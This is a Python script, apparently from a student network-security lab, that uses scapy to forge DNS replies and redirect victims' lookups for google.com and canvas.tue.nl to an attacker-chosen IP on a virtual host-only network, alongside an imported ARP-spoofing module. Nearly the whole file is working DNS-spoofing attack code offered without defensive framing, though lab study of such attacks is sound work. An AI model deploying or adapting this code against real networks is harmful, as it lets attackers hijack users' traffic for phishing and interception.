from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP, TCP
import util
import arpSpoof

networkInterface = "enp0s3"

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

serverIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

# attackerIP = get_if_addr(networkInterface)
# attackerMAC = get_if_hwaddr(networkInterface)


#input :
#catched packet which will be replaced
#host ip adresse for poisoning - target of attacker
#network interfase as string
#output:
#method will send fake dns packet , victim will think that server has replied while
#the attacker will be the one who replies to the victim


#list of websites for redirecting
redirect_to ={
    b"www.google.com" : "192.168.56.102",
    b"google.com" : "192.168.56.102",
    b"canvas.tue.nl" : "192.168.56.102",
    b"www.canvas.tue.nl" : "192.168.56.102"

}
def fake_dns_response(pkt, hostIP, networkInterface, attackerMAC):
    hostMAC = util.getMAC(hostIP, networkInterface)
    dns = Ether(src = attackerMAC, dst = hostMAC)/\
          IP(dst = hostIP, src = pkt[IP].dst) /\
          UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport) /\
          DNS(id = pkt[DNS].id, acount = 1, qr = 1, rd =1, qd = pkt[DNS].qd,
              an = DNSRR(rrname = pkt[DNSQR].qname, type ='A', rclass = pkt[DNSQR].qclass, ttl = 86400, rdata = redirect_to[pkt[DNSQR].qname]))
    dns.show()

    sendp(dns, iface = networkInterface, verbose = False)

def dns_call(pkt, hostIP, mac, networkInterface, attackerMAC):
    website = pkt[DNSQR].qname
    if mac == attackerMAC:
        return

    if website not in redirect_to:
        print("no modification needed : " + website)
        pkt.show()
        return
    else:
          fake_dns_response(pkt, hostIP, networkInterface, attackerMAC)







